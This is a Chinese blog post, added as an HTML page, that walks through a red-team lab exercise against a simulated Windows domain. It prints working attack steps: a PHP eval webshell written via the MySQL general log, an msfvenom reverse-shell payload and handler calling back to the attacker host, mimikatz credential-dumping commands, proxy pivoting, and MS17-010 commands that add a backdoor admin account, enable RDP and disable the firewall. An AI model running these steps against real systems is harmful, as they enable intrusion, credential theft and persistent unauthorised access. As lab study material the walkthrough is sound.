@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="拓扑图 环境搭建三台机器，解压使用vm打开，默认密码hongrisec@2019 网络配置">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATT&amp;CK红队实战靶场01">
+<meta property="og:url" content="https://syst1m.top/2022/07/17/ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/index.html">
+<meta property="og:site_name" content="Syst1m">
+<meta property="og:description" content="拓扑图 环境搭建三台机器，解压使用vm打开，默认密码hongrisec@2019 网络配置">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171452480.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171513229.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171511761.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171517733.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171519266.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171525433.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171529236.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171533073.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171534976.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171534585.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171536904.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171537195.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171540344.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171541043.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171543492.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171543392.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171545007.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171558828.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171601565.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171613114.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171616956.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171618532.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171621412.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171652380.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171653857.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171719877.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171706996.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171720554.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171727686.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171731292.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171733335.png">
+<meta property="article:published_time" content="2022-07-17T06:44:33.000Z">
+<meta property="article:modified_time" content="2022-07-17T09:47:58.988Z">
+<meta property="article:author" content="Syst1m">
+<meta property="article:tag" content="ATT&amp;CK">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png">
+
+
+<link rel="canonical" href="https://syst1m.top/2022/07/17/ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/07/17/ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/","path":"2022/07/17/ATT&CK红队实战靶场01/","title":"ATT&CK红队实战靶场01"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ATT&CK红队实战靶场01 | Syst1m</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Syst1m" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Syst1m</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">1.</span> <span class="nav-text">拓扑图</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">网络配置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA"><span class="nav-number">3.1.</span> <span class="nav-text">靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA"><span class="nav-number">3.2.</span> <span class="nav-text">攻击机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%90%AFweb%E7%8E%AF%E5%A2%83"><span class="nav-number">3.3.</span> <span class="nav-text">开启web环境</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4"><span class="nav-number">4.</span> <span class="nav-text">外网突破</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">4.2.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.3.</span> <span class="nav-text">内网信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.4.</span> <span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="nav-number">5.</span> <span class="nav-text">进入内网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">6.</span> <span class="nav-text">内网打点</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Syst1m"
+      src="/images/IMG_0010.JPG">
+  <!--
+  <p class="site-author-name" itemprop="name">Syst1m</p>
+  -->
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">56</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chencicici" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chencicici" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1343369483@qq.com" title="E-Mail → mailto:1343369483@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.uodrad.top/" title="https:&#x2F;&#x2F;www.uodrad.top&#x2F;" rel="noopener" target="_blank">uodrad</a>
+        </li>
+    </ul>
+  </div>
+
+
+       <!--网易云插件-->
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1933503036&auto=0&height=66">
+      </iframe>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/chencicici" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/07/17/ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0010.JPG">
+      <meta itemprop="name" content="Syst1m">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ATT&CK红队实战靶场01 | Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ATT&CK红队实战靶场01
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-17 14:44:33 / 修改时间：17:47:58" itemprop="dateCreated datePublished" datetime="2022-07-17T14:44:33+08:00">2022-07-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">打靶</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png"></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>三台机器，解压使用vm打开，默认密码hongrisec@2019</p>
+<h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>win7增加一块网卡,设置为桥接模式,用来连通攻击机.仅主机用来连通内网的两台靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171452480.png"></p>
+<h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p>win7 net1桥接 外网192.168.31.183 net2仅主机 内网:192.168.52.143<br>win2003 net1仅主机 内网:192.168.52.141<br>win2003 net1仅主机 内网:192.168.52.138</p>
+<h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><p>kali net1桥接 外网:192.168.31.118</p>
+<h2 id="开启web环境"><a href="#开启web环境" class="headerlink" title="开启web环境"></a>开启web环境</h2><p>在win7启动phpstudy</p>
+<h1 id="外网突破"><a href="#外网突破" class="headerlink" title="外网突破"></a>外网突破</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali扫一下网段,确认靶机ip<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171513229.png"></p>
+<p>访问是一个php探针<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171511761.png"></p>
+<p>接着扫一下目录,存在phpmyadmin<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171517733.png"></p>
+<p>弱密码登录成功 root root<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171519266.png"></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>尝试通过文件写马,但是–secure0file-priv被写死<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171525433.png"></p>
+<p>继续尝试日志写马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>发现日志功能关闭,但是我们可以通过mysql命令开启,并保存修改路径存到我们指定的目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171529236.png"></p>
+<p>开启日志并修改保存路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;</span><br><span class="line">set global general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171533073.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171534976.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171534585.png"></p>
+<p>查询一句话木马,利用日志写入shell.php中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171536904.png"></p>
+<p>蚁剑连接<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171537195.png"></p>
+<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p><code>whoami</code>查看当前用户为管理员<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171540344.png"></p>
+<p><code>ipconfig</code> 发现还存在一个网段<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171541043.png"></p>
+<p><code>net config Workstation</code> 查看当前计算机名称,用户名等详细信息<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171543492.png"></p>
+<p><code>net localgroup administrators</code> 查看其他管理员<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171543392.png"></p>
+<p><code>systeminfo</code> 查看系统信息,发现打了4个补丁,当前域为god.org,域服务器名OWA<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171545007.png"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>由于win7启动了安全模式,所以无法直接反弹shell,用msf生成一个木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.118 LPORT=4444 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.118</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171558828.png"></p>
+<p>提升为system权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171601565.png"></p>
+<p>ps：mimikatz模块已经合并为kiwi模块</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">ls<span class="built_in">a_dump</span>_sam：dump出lsa的SAM</span><br><span class="line">ls<span class="built_in">a_dump</span>_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>抓取密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171613114.png"></p>
+<h1 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看安装的软件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171616956.png"></p>
+<p>查看路由,发现还存在另一个网段192.168.52.0&#x2F;24</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171618532.png"></p>
+<p>添加路由</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24添加录路由；</span><br><span class="line">run autoroute -p查看路由；</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171621412.png"></p>
+<p>设置代理访问内网<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171652380.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvhost 192.168.2.129</span><br><span class="line"><span class="built_in">set</span> srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>配置代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171653857.png"></p>
+<p>测试<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171719877.png"></p>
+<p>探测内网存活主机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171706996.png"></p>
+<p>用nmap扫描却扫不出来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171720554.png"></p>
+<p>刚刚拿下的win7是存在nmap的,用它扫描.进入kali刚刚反弹的会话,蚁剑不是交互式shell看不到返回<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171727686.png"></p>
+<h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><p>两台主机都存在445 和 135 端口,说明存在smb服务<br>尝试ms17_010,发现打不了<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171731292.png"></p>
+<p>再次尝试ms17_010_command,成功执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171733335.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net user hack 8888! /add添加用户；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net localgroup administrators hack /add添加管理员权限；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span>执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span> /关闭防火墙</span><br></pre></td></tr></table></figure>
+
+<p>win2003也是一样的打法不再赘述</p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Syst1m
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
